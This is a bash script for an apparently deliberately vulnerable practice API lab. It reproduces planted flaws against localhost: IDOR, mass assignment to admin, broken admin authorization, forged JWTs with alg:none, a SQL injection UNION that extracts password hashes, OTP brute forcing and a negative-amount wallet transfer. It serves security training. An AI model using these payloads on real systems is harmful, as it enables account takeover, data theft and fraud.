#!/usr/bin/env bash
# Reproduce every planted bug in the practice API, with evidence.
#
# Usage: ./find_bugs.sh [BASE_URL]   (default http://127.0.0.1:8080)
#
# This is a teaching aid: it shows what a finding looks like once you have it.
# Do the same requests by hand before reading this file.
set -uo pipefail

BASE="${1:-http://127.0.0.1:8080}"
say() { printf '\n\033[1;35m%s\033[0m\n' "$*"; }
pretty() { if command -v jq >/dev/null 2>&1; then jq .; else cat; fi; }

say "0. Login as the low-privilege attacker (user id 2)"
LOGIN=$(curl -s -X POST "$BASE/api/v1/auth/login" -H 'Content-Type: application/json' \
  -d '{"email":"attacker@shopkart.test","password":"Passw0rd!"}')
echo "$LOGIN" | pretty
TOKEN=$(printf '%s' "$LOGIN" | sed -n 's/.*"token": *"\([^"]*\)".*/\1/p')
if [ -z "$TOKEN" ]; then
  echo "login failed - is the lab running on $BASE?"
  exit 1
fi

say "B1. BOLA/IDOR - my invoice is id 2, victim's is id 1"
curl -s "$BASE/api/v1/invoices/1" -H "Authorization: Bearer $TOKEN" | pretty

say "B2. Mass assignment - write role=admin onto myself"
curl -s -X PATCH "$BASE/api/v1/users/me" -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d '{"name":"Attacker","role":"admin"}' | pretty

say "B3. Broken function-level auth - admin listing with a user token"
curl -s "$BASE/api/v1/admin/users" -H "Authorization: Bearer $TOKEN" | pretty

say "B4. JWT alg:none - forge a token for the seeded admin (id 3)"
b64() { openssl base64 -A | tr '+/' '-_' | tr -d '='; }
HEADER=$(printf '{"alg":"none","typ":"JWT"}' | b64)
PAYLOAD=$(printf '{"sub":3,"email":"admin@shopkart.test","role":"admin","exp":9999999999}' | b64)
curl -s "$BASE/api/v1/users/me" -H "Authorization: Bearer $HEADER.$PAYLOAD." | pretty

say "B5. Excessive data exposure - password hash, aadhaar, phone for any id"
curl -s "$BASE/api/v1/users/1" -H "Authorization: Bearer $TOKEN" | pretty

say "B6. SQL injection - UNION-extract every password hash"
curl -s -G "$BASE/api/v1/search" --data-urlencode \
  "q=x%' UNION SELECT id,password,name FROM users-- -" | pretty

say "B6b. Error leakage - the failing query comes back with the SQL"
curl -s -G "$BASE/api/v1/search" --data-urlencode "q='" | pretty

say "B7. OTP brute force - no attempt cap on a 4-digit code"
curl -s -X POST "$BASE/api/v1/auth/register" -H 'Content-Type: application/json' \
  -d '{"email":"newbie@shopkart.test","password":"Passw0rd!","name":"New"}' >/dev/null
OTP=$(curl -s -G "$BASE/api/v1/_lab/otp" --data-urlencode "email=newbie@shopkart.test" |
  sed -n 's/.*"otp": *"\([^"]*\)".*/\1/p')
echo "lab helper reveals OTP=$OTP (a real target would not have this endpoint)"
for guess in 0000 1111 2222 3333 "$OTP"; do
  code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/api/v1/auth/verify-otp" \
    -H 'Content-Type: application/json' \
    -d "{\"email\":\"newbie@shopkart.test\",\"otp\":\"$guess\"}")
  printf 'otp=%s -> %s\n' "$guess" "$code"
done

say "B8. Business logic - a negative transfer mints balance"
curl -s "$BASE/api/v1/users/me" -H "Authorization: Bearer $TOKEN" | pretty
curl -s -X POST "$BASE/api/v1/wallet/transfer" -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"to_email":"victim@shopkart.test","amount":-99999}' | pretty

say "Reset the lab state when you are done"
curl -s -X POST "$BASE/api/v1/_lab/reset" | pretty
